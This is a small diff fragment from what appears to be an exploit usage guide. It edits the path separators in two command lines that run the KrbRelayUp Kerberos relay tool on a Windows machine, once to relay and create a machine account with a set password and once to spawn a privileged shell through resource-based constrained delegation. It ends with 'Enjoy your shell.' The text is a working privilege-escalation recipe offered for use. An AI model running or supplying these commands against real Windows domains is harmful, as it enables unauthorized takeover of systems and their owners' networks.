@@ -11,9 +11,9 @@ Make sure to place your binary `update.exe` under `C:\Temp`, otherwise it won't 
 
 And run KrbRelayUp exploit on the windows machine:
 
-`./KrbRelayUp.exe relay -c -cn machAccount$ -cp pass@123`
+`.\KrbRelayUp.exe relay -c -cn machAccount$ -cp pass@123`
 
-`./KrbRelayUp.exe spawn -m rbcd -d <bla.local> -dc <DC.bla.local> -cn machAccount$ -cp pass@123`
+`.\KrbRelayUp.exe spawn -m rbcd -d <bla.local> -dc <DC.bla.local> -cn machAccount$ -cp pass@123`
 
 Enjoy your shell.
 
